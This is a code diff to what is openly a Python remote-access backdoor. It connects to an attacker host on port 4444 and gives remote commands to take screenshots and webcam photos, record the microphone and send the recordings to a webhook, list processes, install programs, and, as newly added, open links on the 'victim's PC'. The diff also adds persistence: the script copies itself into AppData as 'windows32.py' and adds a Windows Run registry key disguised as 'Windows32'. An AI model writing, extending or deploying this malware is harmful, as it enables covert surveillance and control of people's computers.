@@ -1,12 +1,15 @@
 import cv2
 import os
+import sys
 import socket
 import subprocess
 import time
 import psutil
 import ctypes
 import pynput
+import shutil
 import requests
+import webbrowser
 import pyautogui
 from requests import get    
 from termcolor import colored
@@ -20,7 +23,7 @@ from cv2 import imshow, imwrite, destroyWindow, waitKey
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-ip = "192.168.1.5"
+ip = "192.168.1.6"
 port = 4444
 ipadd = get('https://api.ipify.org').text
 
@@ -32,7 +35,8 @@ class back:
                     "|| 3.) webcam -webhook     -- To take webcam photo.            ||\n"+
                     "|| 4.) record t c web      -- To record sound from Mic.        ||\n"+
                     "|| 5.) list                -- To list the process id.          ||\n"+
-                    "|| 6.) install             -- To install any program.          ||\n"
+                    "|| 6.) install             -- To install any program.          ||\n"+
+                    "|| 7.) open -link          -- To open any url on victim's PC   ||\n"+
                     "===============================================================\n")
         s.send(self.help_.encode())
 
@@ -90,6 +94,9 @@ class back:
         webhook.add_embed(embed)
         response = webhook.execute()
         os.remove("recording1.wav")
+    
+    def open_url(self, link):
+        webbrowser.open_new(link)
                 
     def shell(self):
         while True:
@@ -110,7 +117,11 @@ class back:
             elif (cmd[:6] == "screen"):
                 time.sleep(0.5)
                 fi = cmd[7:-1] 
-                self.screenshot(fi)  
+                self.screenshot(fi)
+
+            elif (cmd[:4] == "open"):
+                fi = cmd[5:-1]
+                self.open_url(fi)  
 
             elif (cmd[:6] == "webcam"):
                 time.sleep(0.5)
@@ -169,6 +180,11 @@ class back:
         s.send(banner.encode())
 
         self.shell()
+
+location = os.environ["appdata"] + "\\windows32.py"
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable, location)
+    subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows32 /t REG_SZ /d"' + location +'"', shell=True)
 
 backdoor = back()
 backdoor.main()
